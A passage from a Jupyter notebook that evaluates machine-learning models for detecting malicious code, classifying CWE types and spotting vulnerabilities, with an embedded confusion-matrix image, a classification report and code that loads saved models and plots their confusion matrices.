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a+XKlYqOjta8efO0bds2RUdHp+vxhQoVUpcuXfTYY49p6tSpuvfee3Xo0CEdO3ZMbdq0sfR/+umnValSJY0ZM0Zt27bVli1b9MYbb2j69OmOPnXr1tUbb7yh2NhYJScna+jQoU6V0IkTJypPnjwqX768fHx8tGTJEkVGRiokJOQ/nw/gTsWcRNxWnTt31sWLF3X//ferT58+euqpp9SzZ09J0uzZs9W5c2c9/fTTKlGihFq0aOFUBbwVEydOVGxsrB588EHVr19f1apVU6lSpeTn55dZTwnANZ544gm1atVKbdu2VeXKlXXy5EmnqmJ6zJgxQw8//LB69+6tkiVLqkePHjp//nyafe+77z4tXrxYH3zwgcqUKaMXX3xRo0ePVteuXR19JkyYoAIFCqhGjRrq0KGDBg8erOzZszu2BwYGavz48apYsaIqVaqkP/74Q1999ZV8fPgzCe9lM5kxoQu4Q5w/f1758uXThAkT1L17d3eHAwCAx2K4GXe1HTt26Ndff9X999+vs2fPavTo0ZKk5s2buzkyAAA8G0ki7nqvv/669u7dK19fX1WoUEFff/21cufO7e6wAADwaAw3AwAAwIIZuQAAALAgSQQAAIAFSSIAAAAsSBIBAABgQZIIAAAAC5JEAJmma9euatGiheN+7dq1NWDAgNsex/r162Wz2XTmzBmXHePa53orbkecAHCrSBKBu1zXrl1ls9lks9nk6+urokWLavTo0bpy5YrLj/3JJ59ozJgx6ep7uxOmQoUKafLkybflWABwJ2IxbcALNG7cWLNnz1ZiYqK++uor9enTR9myZdOwYcMsfZOSkuTr65spxw0NDc2U/QAAbj8qiYAXsNvtioyMVFRUlHr16qX69evr888/l/R/w6YvvfSS8ubNqxIlSkiS/vzzT7Vp00YhISEKDQ1V8+bN9ccffzj2mZycrEGDBikkJES5cuXSM888o2vX5r92uDkxMVFDhw5VgQIFZLfbVbRoUb377rv6448/VKdOHUlSzpw5ZbPZ1LVrV0lSSkqKxo0bp+joaPn7++vee+/VRx995HScr776SsWLF5e/v7/q1KnjFOetSE5OVvfu3R3HLFGihKZMmZJm31GjRiksLExBQUF68sknlZSU5NiWntgBwFNRSQS8kL+/v06ePOm4v2bNGgUFBWn16tWSpMuXL6tRo0aKjY3V119/raxZs2rs2LFq3LixfvrpJ/n6+mrChAmaM2eO3nvvPZUqVUoTJkzQp59+qrp16173uJ07d9aWLVs0depU3XvvvTp48KBOnDihAgUK6OOPP1br1q21d+9eBQUFyd/fX5I0btw4zZ8/XzNnzlSxYsW0ceNGPfroowoLC1OtWrX0559/qlWrVurTp4969uyp77//Xk8//fR/Oj8pKSnKnz+/lixZoly5cmnz5s3q2bOn8uTJozZt2jidNz8/P61fv15//PGHunXrply5cumll15KV+wA4NEMgLtaly5dTPPmzY0xxqSkpJjVq1cbu91uBg8e7NgeERFhEhMTHY+ZN2+eKVGihElJSXG0JSYmGn9/f7Ny5UpjjDF58uQx48ePd2y/fPmyyZ8/v+NYxhhTq1Yt89RTTxljjNm7d6+RZFavXp1mnOvWrTOSzOnTpx1tly5dMtmzZzebN2926tu9e3fTvn17Y4wxw4YNM6VLl3baPnToUMu+rhUVFWUmTZp03e3X6tOnj2ndurXjfpcuXUxoaKg5f/68o23GjBkmICDAJCcnpyv2tJ4zAHgKKomAF1i2bJkCAgJ0+fJlpaSkqEOHDho5cqRje0xMjNM8xB9//FH79+9XYGCg034uXbqkAwcO6OzZs4qLi1PlypUd27JmzaqKFStahpxT7dy5U1myZMlQBW3//v26cOGCGjRo4NSelJSk8uXLS5L27NnjFIckxcbGpvsY1/Pmm2/qvffe0+HDh3Xx4kUlJSWpXLlyTn3uvfdeZc+e3em4CQkJ+vPPP5WQkHDT2AHAk5EkAl6gTp06mjFjhnx9fZU3b15lzer8q58jRw6n+wkJCapQoYIWLFhg2VdYWNgtxZA6fJwRCQkJkqQvv/xS+fLlc9pmt9tvKY70+OCDDzR48GBNmDBBsbGxCgwM1GuvvaatW7emex/uih0AMgtJIuAFcuTIoaJFi6a7/3333acPP/xQ4eHhCgoKSrNPnjx5tHXrVtWsWVOSdOXKFW3fvl333Xdfmv1jYmKUkpKiDRs2qH79+pbtqZXM5ORkR1vp0qVlt9t1+PDh61YgS5Uq5bgIJ9W333578yd5A998842qVq2q3r17O9oOHDhg6ffjjz/q4sWLjgT422+/VUBAgAoUKKDQ0NCbxg4AnoyrmwFYdOzYUblz51bz5s319ddf6+DBg1q/fr369++vv/76S5L01FNP6ZVXXtHSpUv166+/qnfv3jdc47BQoULq0qWLHnvsMS1dutSxz8WLF0uSoqKiZLPZtGzZMh0/flwJCQkKDAzU4MGDNXDgQM2dO1cHDhzQDz/8oGnTpmnu3LmSpCeffFL79u3TkCFDtHfvXi1cuFBz5sxJ1/P8+++/tXPnTqfb6dOnVaxYMX3//fdauXKlfvvtNw0fPlzbtm2zPD4pKUndu3fXL7/8oq+++kojRoxQ37595ePjk67YAcCjuXtSJADXuvrClYxsj4uLM507dza5c+c2drvdFC5c2PTo0cOcPXvWGPPvhSpPPfWUCQoKMiEhIWbQoEGmc+fO171wxRhjLl68aAYOHGjy5MljfH19TdGiRc17773n2D569GgTGRlpbDab6dKlizHm34ttJk+ebEqUKGGyZctmwsLCTKNGjcyGDRscj/viiy9M0aJFjd1uNzVq1DDvvfdeui5ckWS5zZs3z1y6dMl07drVBAcHm5CQENOrVy/z7LPPmnvvvddy3l588UWTK1cuExAQYHr06GEuXbrk6HOz2LlwBYAnsxlznVnmAAAA8FoMNwMAAMCCJBEAAAAWJIkAAACwIEkEAACABUkiAAAALEgSAQAAYEGSCAAAAAuSRAAAAFiQJAIAAMCCJBEAAAAWJIkAAACw+H/gKtxsZFpCaAAAAABJRU5ErkJggg==\n"
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "Classification Report for model_mal:\n",
            "              precision    recall  f1-score   support\n",
            "\n",
            "      benign       0.98      0.92      0.95       110\n",
            "   malicious       0.97      0.99      0.98       334\n",
            "\n",
            "    accuracy                           0.98       444\n",
            "   macro avg       0.98      0.96      0.97       444\n",
            "weighted avg       0.98      0.98      0.97       444\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Execute the confusion matrix visualization cell\n",
        "# Assuming the necessary models and test data are now loaded in the environment.\n",
        "# The visualization code is in cell Lm1TvVOasrQK\n",
        "# The code from Lm1TvVOasrQK will be copied here for execution.\n",
        "\n",
        "import numpy as np\n",
        "import matplotlib.pyplot as plt\n",
        "import seaborn as sns\n",
        "from sklearn.metrics import confusion_matrix, classification_report\n",
        "from sklearn.preprocessing import LabelEncoder\n",
        "import pickle\n",
        "import os\n",
        "\n",
        "# Define the directory where models are saved\n",
        "model_save_dir = os.path.join(workspace_path, 'model')\n",
        "\n",
        "# Define specific file paths to load\n",
        "model_full_path_load = os.path.join(model_save_dir, 'model_full_20250918_063532.pkl')\n",
        "label_encoder_full_path_load = os.path.join(model_save_dir, 'label_encoder_full_20250918_063532.pkl')\n",
        "model_final_path_load = os.path.join(model_save_dir, 'model_final_20250918_063532.pkl')\n",
        "label_encoder_final_path_load = os.path.join(model_save_dir, 'label_encoder_final_20250918_063532.pkl')\n",
        "model_mal_path_load = os.path.join(model_save_dir, 'model_mal.pkl') # Assuming this one doesn't have timestamp yet\n",
        "label_encoder_mal_path_load = os.path.join(model_save_dir, 'label_encoder_mal.pkl') # Assuming this one doesn't have timestamp yet\n",
        "\n",
        "\n",
        "# Load the saved models and label encoders\n",
        "model_full = None\n",
        "model_final = None\n",
        "model_mal = None # Initialize model_mal as well\n",
        "label_encoder_full = None\n",
        "label_encoder_final = None\n",
        "label_encoder_mal = None # Initialize label_encoder_mal as well\n",
        "\n",
        "try:\n",
        "    with open(model_full_path_load, 'rb') as f:\n",
        "        model_full = pickle.load(f)\n",
        "    print(f\"model_full loaded successfully from {model_full_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {model_full_path_load} not found.\")\n",
        "\n",
        "try:\n",
        "    with open(label_encoder_full_path_load, 'rb') as f:\n",
        "        label_encoder_full = pickle.load(f)\n",
        "    print(f\"label_encoder_full loaded successfully from {label_encoder_full_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {label_encoder_full_path_load} not found.\")\n",
        "\n",
        "try:\n",
        "    with open(model_final_path_load, 'rb') as f:\n",
        "        model_final = pickle.load(f)\n",
        "    print(f\"model_final loaded successfully from {model_final_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {model_final_path_load} not found.\")\n",
        "\n",
        "try:\n",
        "    with open(label_encoder_final_path_load, 'rb') as f:\n",
        "        label_encoder_final = pickle.load(f)\n",
        "    print(f\"label_encoder_final loaded successfully from {label_encoder_final_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {label_encoder_final_path_load} not found.\")\n",
        "\n",
        "# Attempt to load model_mal and its label encoder as well, assuming standard names\n",
        "try:\n",
        "    with open(model_mal_path_load, 'rb') as f:\n",
        "        model_mal = pickle.load(f)\n",
        "    print(f\"model_mal loaded successfully from {model_mal_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {model_mal_path_load} not found.\")\n",
        "\n",
        "try:\n",
        "    with open(label_encoder_mal_path_load, 'rb') as f:\n",
        "        label_encoder_mal = pickle.load(f)\n",
        "    print(f\"label_encoder_mal loaded successfully from {label_encoder_mal_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {label_mal_path_load} not found.\")\n",
        "\n",
        "\n",
        "# Function to plot confusion matrix\n",
        "def plot_confusion_matrix(y_true, y_pred, classes, title='Confusion Matrix'):\n",
        "    cm = confusion_matrix(y_true, y_pred)\n",
        "    plt.figure(figsize=(8, 6))\n",
        "    sns.heatmap(cm, annot=True, fmt='d', cmap='Blues', xticklabels=classes, yticklabels=classes)\n",
        "    plt.title(title)\n",
        "    plt.xlabel('Predicted Label')\n",
        "    plt.ylabel('True Label')\n",
        "    plt.show()\n",
        "\n",
        "# --- Confusion Matrix for model_full (df dataset) ---\n",
        "print(\"--- Confusion Matrix for model_full (CWE Classification) ---\")\n",
        "# Check if model and required test data are loaded/available\n",
        "if model_full is not None and 'X_test_full' in locals() and 'y_test_full' in locals() and label_encoder_full is not None:\n",
        "\n",
        "    # Get predictions\n",
        "    y_pred_full = model_full.predict(X_test_full)\n",
        "    y_pred_classes_full = np.argmax(y_pred_full, axis=1)\n",
        "    y_true_classes_full = np.argmax(y_test_full, axis=1) # y_test_full is one-hot encoded\n",
        "\n",
        "    # Convert numerical labels back to original class names for plotting\n",
        "    true_labels_full = label_encoder_full.inverse_transform(y_true_classes_full)\n",
        "    predicted_labels_full = label_encoder_full.inverse_transform(y_pred_classes_full)\n",
        "\n",
        "    # Get the unique class names from the label encoder\n",
        "    class_names_full = label_encoder_full.classes_\n",
        "\n",
        "    # Plot confusion matrix\n",
        "    plot_confusion_matrix(true_labels_full, predicted_labels_full, class_names_full, title='Confusion Matrix for model_full (CWE Classification)')\n",
        "\n",
        "    # Print classification report\n",
        "    print(\"\\nClassification Report for model_full:\")\n",
        "    print(classification_report(true_labels_full, predicted_labels_full, target_names=class_names_full))\n",
        "else:\n",
        "    print(\"Required variables (model_full, test data, label_encoder_full) for model_full analysis not found. Skipping.\")\n",
        "\n",
        "\n",
        "# --- Confusion Matrix for model_final (df_final dataset - Vulnerability Detection) ---\n",
        "print(\"\\n--- Confusion Matrix for model_final (Vulnerability Detection) ---\")\n",
        "if model_final is not None and 'X_test_final' in locals() and 'y_test_final' in locals() and label_encoder_final is not None:\n",
        "\n",
        "    # Get predictions (probabilities for binary classification)\n",
        "    y_pred_final_probs = model_final.predict(X_test_final)\n",
        "    # Convert probabilities to binary predictions (0 or 1)\n",
        "    y_pred_final_classes = (y_pred_final_probs > 0.5).astype(int)\n",
        "\n",
        "    # y_test_final is already encoded numerical labels (0 or 1)\n",
        "    y_true_final_classes = y_test_final\n",
        "\n",
        "    # Define class names for model_final (explicitly as strings)\n",
        "    class_names_final = ['0', '1'] # Assuming 0 and 1 are the classes for model_final\n",
        "\n",
        "    # Plot confusion matrix\n",
